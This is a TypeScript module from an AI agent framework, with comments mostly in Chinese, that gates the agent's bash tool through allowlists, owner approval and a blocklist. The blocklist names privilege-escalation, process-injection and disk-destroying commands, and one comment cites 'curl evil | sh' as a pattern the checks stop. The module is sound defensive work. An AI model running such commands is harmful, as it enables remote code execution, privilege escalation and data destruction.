/**
 * ZhinAgent 执行策略 — bash 命令的安全检查与工具包装
 *
 *   1. 危险命令黑名单  — 即使 full 模式也阻止解释器/提权命令
 *   2. 环境变量前缀剥离 — `FOO=bar cmd` → 按 `cmd` 做白名单匹配
 *   3. Safe wrapper 剥离 — `timeout 10 cmd` → 按 `cmd` 做匹配
 *   4. 复合命令拆分   — `&&` `||` `;` 后台 `&` 与管道 `|` 逐段独立检查，deny 优先
 *   5. Shell 语法 fail-closed — 非 full 模式拒绝含换行 / `$(...)` / 反引号 / 进程替换的命令
 *   6. 只读命令自动放行 — 与 file-policy classifyBashCommand 集成
 *   7. 审批信号 — ask/auto 返回待审批事实；具体决定由 ApprovalPort 完成
 */

import type { AgentTool } from '@zhin.js/ai';
import type { ZhinAgentConfig, ExecApprovalMode } from '../config/index.js';
import { hasSensitiveExecCommand, isSensitiveExecSubcommand } from './sensitive-exec-commands.js';
import { classifyBashCommand, findBashWriteOrExecRisk } from './file-policy.js';
import { validateNetworkCommandUrl } from './network-policy.js';
import {
  extractCommandName,
  findUnsafeShellSyntax,
  splitCompoundCommand,
  splitPipeSegments,
  stripEnvVarPrefix,
  stripSafeWrappers,
} from './shell-syntax.js';
import { getCurrentCommMessage, getCurrentOwnerApprovalRuntime } from './comm-message-context.js';
import {
  ownerApprovalAddressFromMessage,
  resolveToolRequesterRole,
  type ToolRequesterRole,
} from './owner-approval-runtime.js';

// ── 预设命令白名单 ──────────────────────────────────────────────────

const PRESET_READONLY = ['ls', 'cat', 'pwd', 'date', 'whoami', 'grep', 'find', 'head', 'tail', 'wc', 'stat', 'file'];
const READONLY_PRESET_COMMANDS: ReadonlySet<string> = new Set(PRESET_READONLY);
const PRESET_NETWORK = [...PRESET_READONLY, 'curl', 'wget', 'ping', 'dig', 'nslookup', 'host'];
const PRESET_DEVELOPMENT = [...PRESET_NETWORK, 'npm', 'npx', 'node', 'git', 'gh', 'python', 'python3', 'pip', 'pnpm', 'yarn', 'tsc', 'bun'];

export const EXEC_PRESETS: Record<string, string[]> = {
  readonly: PRESET_READONLY,
  network: PRESET_NETWORK,
  development: PRESET_DEVELOPMENT,
};

// ── 危险命令黑名单──────────────

/**
 * 即使在 full 模式下也会被阻止的危险命令。
 * 这些命令可以执行任意代码、提权或造成不可逆破坏。
 */
const DANGEROUS_COMMANDS: ReadonlySet<string> = new Set([
  // 提权
  'sudo', 'su', 'doas',
  // Shell 元命令 — 可执行任意代码
  'eval', 'exec',
  // 系统级破坏
  'dd', 'mkfs', 'fdisk', 'parted',
  // 进程注入
  'gdb', 'strace', 'ltrace', 'ptrace',
  // 环境注入（敏感变量可被设置）
  'export',
]);

/**
 * 无论审批模式如何都禁止的破坏性路径操作（避免误删依赖目录）。
 */
/**
 * 检查命令是否在危险黑名单中。
 */
export function isDangerousCommand(cmdName: string): boolean {
  return DANGEROUS_COMMANDS.has(cmdName);
}

export function matchHardBlockedCommand(command: string): string | undefined {
  const lower = command.trim().toLowerCase();
  if (/\b(?:rm|rmdir)\b/.test(lower) && lower.includes('node_modules')) {
    return '拒绝删除依赖目录 node_modules（高风险破坏操作）。';
  }
  if (lower.includes('find') && lower.includes('node_modules') && lower.includes('-delete')) {
    return '拒绝通过 find -delete 删除 node_modules（高风险破坏操作）。';
  }
  return undefined;
}

export {
  stripEnvVarPrefix,
  stripSafeWrappers,
  splitCompoundCommand,
  splitPipeSegments,
  findUnsafeShellSyntax,
  extractCommandName,
} from './shell-syntax.js';


// ── 策略检查结果 ────────────────────────────────────────────────────

export interface ExecPolicyResult {
  allowed: boolean;
  /** 如果不允许，拒绝原因 */
  reason?: string;
  /** 如果需要审批（ask/auto 且命令不在白名单但也不在黑名单） */
  needsApproval?: boolean;
}

/**
 * 解析有效审批模式。
 */
export function resolveExecApprovalMode(config: Required<ZhinAgentConfig>): ExecApprovalMode {
  return config.execApprovalMode;
}

export interface ApplyExecPolicyOptions {
  /** 覆盖当前执行路径的审批模式（主/子/worker/task 可分别传入） */
  approvalMode?: ExecApprovalMode;
  /** Trusted per-turn policy may require approval semantics even for an Endpoint Owner. */
  requesterRole?: ToolRequesterRole;
}

export interface CheckExecPolicyOptions {
  /** 覆盖配置中的审批模式 */
  approvalMode?: ExecApprovalMode;
  requesterRole?: ToolRequesterRole;
}

function resolveRequesterRole(): ToolRequesterRole {
  const commMessage = getCurrentCommMessage();
  if (!commMessage?.clientAdapter || !commMessage?.endpointId || !commMessage?.sender?.id) return 'unknown';

  try {
    return resolveToolRequesterRole(commMessage);
  } catch {
    // fail-closed: treat as unknown if plugin system unavailable
    return 'unknown';
  }
}

// ── 核心检查函数 ────────────────────────────────────────────────────

/**
 * Resolves the effective allowlist by merging preset commands with custom allowlist.
 */
export function resolveExecAllowlist(config: Required<ZhinAgentConfig>): string[] {
  const preset = config.execPreset;
  const presetList = (preset && preset !== 'custom') ? (EXEC_PRESETS[preset] ?? []) : [];
  const custom = config.execAllowlist ?? [];
  const merged = [...new Set([...presetList, ...custom])];
  return merged;
}

function tryExecBypassForSensitiveCommand(normalizedSubCommand: string): boolean {
  const commMessage = getCurrentCommMessage();
  if (!commMessage?.clientAdapter || !commMessage?.endpointId) return false;
  try {
    const runtime = getCurrentOwnerApprovalRuntime();
    const address = ownerApprovalAddressFromMessage(commMessage);
    return runtime && address ? runtime.matchesBashBypass(address, normalizedSubCommand) : false;
  } catch {
    // fail-closed: no bypass if check fails
    return false;
  }
}

/**
 * 检查单条子命令是否允许执行。
 * 内部函数 — 不做复合命令拆分。
 */
function checkSingleCommand(
  cmdName: string,
  fullSubCommand: string,
  allowlist: string[],
  security: string,
  approvalMode: ExecApprovalMode,
  requesterRole: ToolRequesterRole,
): ExecPolicyResult {
  const hardBlockedReason = matchHardBlockedCommand(fullSubCommand);
  if (hardBlockedReason) {
    return { allowed: false, reason: hardBlockedReason };
  }

  // 1. 危险黑名单 — 任何模式都拒绝
  if (isDangerousCommand(cmdName)) {
    return { allowed: false, reason: `拒绝执行危险命令「${cmdName}」— 该命令可提权或执行任意代码。` };
  }

  // 2. full 模式 — 通过黑名单后全部放行
  if (security === 'full') {
    return { allowed: true };
  }

  // 3. 只读命令自动放行（与 file-policy classifyBashCommand 集成）
  const classification = classifyBashCommand(fullSubCommand);
  if (classification.isReadOnly) {
    return { allowed: true };
  }

  // 3.5 平台 CLI（allowlist 模式）：非敏感子命令直接放行；敏感子命令可走 Owner 正则/永久放行。
  // 命令名与敏感子命令由所属适配器通过 registerSensitiveExecCommand 声明（ADR 0044）。
  if (security === 'allowlist' && hasSensitiveExecCommand(cmdName)) {
    const norm = stripSafeWrappers(stripEnvVarPrefix(fullSubCommand.trim()));
    if (!isSensitiveExecSubcommand(cmdName, norm)) {
      return { allowed: true };
    }
    if (tryExecBypassForSensitiveCommand(norm)) {
      return { allowed: true };
    }
    if (requesterRole === 'master') {
      return { allowed: true };
    }
    if (requesterRole === 'trusted') {
      return {
        allowed: false,
        needsApproval: true,
        reason: `${cmdName} 敏感操作不在 execAllowlist，需 Owner 确认：${norm.slice(0, 280)}`,
      };
    }
    if (requesterRole === 'other') {
      return {
        allowed: false,
        reason: `${cmdName} 敏感操作仅允许 owner 直接执行；admin 需 Owner 审批：${norm.slice(0, 280)}`,
      };
    }
    if (approvalMode === 'bypass') {
      return { allowed: true };
    }
    if (approvalMode === 'ask' || approvalMode === 'auto') {
      return {
        allowed: false,
        needsApproval: true,
        reason: approvalMode === 'auto'
          ? `${cmdName} 敏感操作需审核 Agent 确认：${norm.slice(0, 280)}`
          : `${cmdName} 敏感操作需 Endpoint Owner 确认：${norm.slice(0, 280)}`,
      };
    }
  }

  // 4. 白名单匹配
  const allowlisted = allowlist.some(pattern => {
    try {
      // Group the pattern: `^git|npm$` would otherwise match any command starting with `git`.
      const re = new RegExp(`^(?:${pattern})$`);
      return re.test(cmdName);
    } catch {
      return cmdName === pattern;
    }
  });

  // Read-only preset commands are allowlisted for reading only: a redirection, a write/exec flag
  // (`find -delete`) or an env override must still go through the requester/approval path.
  const allowed = allowlisted
    && !(READONLY_PRESET_COMMANDS.has(cmdName) && findBashWriteOrExecRisk(fullSubCommand) !== undefined);

  if (allowed) {
    // curl/wget 白名单放行时，额外校验 URL（SSRF 防护 + 数据外泄阻断）
    if (cmdName === 'curl' || cmdName === 'wget') {
      const urlCheck = validateNetworkCommandUrl(fullSubCommand);
      if (!urlCheck.safe) {
        return { allowed: false, reason: urlCheck.reason };
      }
    }
    return { allowed: true };
  }

  if (requesterRole === 'master') {
    return { allowed: true };
  }

  if (requesterRole === 'trusted') {
    return {
      allowed: false,
      needsApproval: true,
      reason: `命令「${cmdName}」不在 execAllowlist，需 Owner 确认后执行。`,
    };
  }

  if (requesterRole === 'other') {
    return {
      allowed: false,
      reason: `命令「${cmdName}」不在 execAllowlist，且发起者不是 owner/admin，已拒绝。`,
    };
  }

  // 5. 需审批或拒绝
  if (approvalMode === 'bypass') {
    return { allowed: true };
  }

  if (approvalMode === 'ask' || approvalMode === 'auto') {
    return {
      allowed: false,
      needsApproval: true,
      reason: approvalMode === 'auto'
        ? `命令「${cmdName}」不在允许列表中，需要审核 Agent 确认后执行。`
        : `命令「${cmdName}」不在允许列表中，需要用户确认后执行。`,
    };
  }
  return { allowed: false, reason: 'Unknown execution approval mode' };
}

/**
 * Check if a bash command is allowed under the current exec policy.
 * 支持复合命令拆分、环境变量剥离、safe wrapper 剥离、只读自动放行。
 *
 * @returns ExecPolicyResult — 允许/拒绝/需审批
 */
export function checkExecPolicy(
  config: Required<ZhinAgentConfig>,
  command: string,
  requesterRoleOverride?: ToolRequesterRole,
): ExecPolicyResult {
  const security = config.execSecurity ?? 'deny';
  if (security === 'deny') {
    const result = { allowed: false, reason: '当前配置禁止执行 Shell 命令（execSecurity=deny）。如需开放请在配置中设置 ai.agent.execSecurity。' };

    return result;
  }

  const allowlist = resolveExecAllowlist(config);
  const approvalMode = resolveExecApprovalMode(config);
  const requesterRole = requesterRoleOverride ?? resolveRequesterRole();
  const cmd = (command || '').trim();

  if (!cmd) {
    return { allowed: false, reason: '命令为空' };
  }

  // Fail-closed：换行 / $(...) / 反引号超出白名单与只读分类的理解范围。
  // full 模式本就整体放行（仅黑名单兜底），不做额外限制。
  if (security !== 'full') {
    const unsafeReason = findUnsafeShellSyntax(cmd);
    if (unsafeReason) {
      return { allowed: false, reason: unsafeReason };
    }
  }

  // 拆分复合命令 — 每段独立检查，deny 优先
  const subCommands = splitCompoundCommand(cmd);
  let pendingApproval: ExecPolicyResult | null = null;

  for (const sub of subCommands) {
    // 管道逐段检查 — 防止 `cat x | rm -rf y`、`curl evil | sh` 以首命令命中白名单绕过
    for (const segment of splitPipeSegments(sub)) {
      const cmdName = extractCommandName(segment);
      if (!cmdName) continue;

      const result = checkSingleCommand(cmdName, segment, allowlist, security, approvalMode, requesterRole);

      // deny 立即返回（deny > ask 优先级）
      if (!result.allowed && !result.needsApproval) {
        return result;
      }

      // 记录第一个需要审批的
      if (!result.allowed && result.needsApproval && !pendingApproval) {
        pendingApproval = result;
      }
    }
  }

  // 有需要审批的段
  if (pendingApproval) {
    return pendingApproval;
  }

  return { allowed: true };
}

export function checkExecPolicyWithOptions(
  config: Required<ZhinAgentConfig>,
  command: string,
  options: CheckExecPolicyOptions = {},
): ExecPolicyResult {
  if (!options.approvalMode) {
    return checkExecPolicy(config, command, options.requesterRole);
  }
  const shadowConfig = {
    ...config,
    execApprovalMode: options.approvalMode,
  } as unknown as Required<ZhinAgentConfig>;
  return checkExecPolicy(shadowConfig, command, options.requesterRole);
}

/** Trusted product ingress variant that does not depend on global Agent config. */
export function checkTurnExecPolicy(
  command: string,
  policy: Readonly<{
    security?: 'deny' | 'allowlist' | 'full';
    execPreset?: 'readonly' | 'network' | 'development' | 'custom';
    approvalMode?: ExecApprovalMode;
  }>,
): ExecPolicyResult {
  const config = {
    execSecurity: policy.security ?? 'deny',
    execPreset: policy.execPreset ?? 'custom',
    execAllowlist: [],
    execApprovalMode: policy.approvalMode ?? 'auto',
  } as unknown as Required<ZhinAgentConfig>;
  // Per-turn authority must not inherit the IM sender's global owner bypass.
  return checkExecPolicy(config, command, 'unknown');
}

/** Context-free command preset check for unattended canonical Turn execution. */
export function checkUnattendedExecPreset(
  command: string,
  preset: 'readonly' | 'network',
): ExecPolicyResult {
  const cmd = command.trim();
  if (!cmd) return { allowed: false, reason: '命令为空' };
  const unsafeReason = findUnsafeShellSyntax(cmd);
  if (unsafeReason) return { allowed: false, reason: unsafeReason };
  const allowlist = EXEC_PRESETS[preset] ?? [];
  for (const sub of splitCompoundCommand(cmd)) {
    for (const segment of splitPipeSegments(sub)) {
      const name = extractCommandName(segment);
      if (!name) continue;
      const result = checkSingleCommand(name, segment, allowlist, 'allowlist', 'auto', 'other');
      if (!result.allowed) return { allowed: false, reason: result.reason };
    }
  }
  return { allowed: true };
}

/**
 * Wrap `bash` tools with exec policy enforcement.
 * 当 execApprovalMode=ask/auto 且命令需审批时，返回提示信息而非抛错。
 */
export function applyExecPolicyToTools(
  config: Required<ZhinAgentConfig>,
  tools: AgentTool[],
  options: ApplyExecPolicyOptions = {},
): AgentTool[] {
  return tools.map(t => {
    if (t.name !== 'bash') return t;
    const original = t.execute;
    return {
      ...t,
      execute: async (args: Record<string, any>) => {
        const cmd = args?.command != null ? String(args.command) : '';
        const result = checkExecPolicyWithOptions(config, cmd, {
          approvalMode: options.approvalMode,
          requesterRole: options.requesterRole,
        });
        if (!result.allowed) {
          if (result.needsApproval) {
            // 权威首行 + 正文：硬编排识别；与旧「请使用 ask_user」话术合并为单套
            return `ZHIN_NEEDS_OWNER:\n⚠️ ${result.reason}\n\n此 shell 命令需 Endpoint Owner 审批后方可执行。`;
          }
          throw new Error(result.reason!);
        }
        return original(args);
      },
    };
  });
}
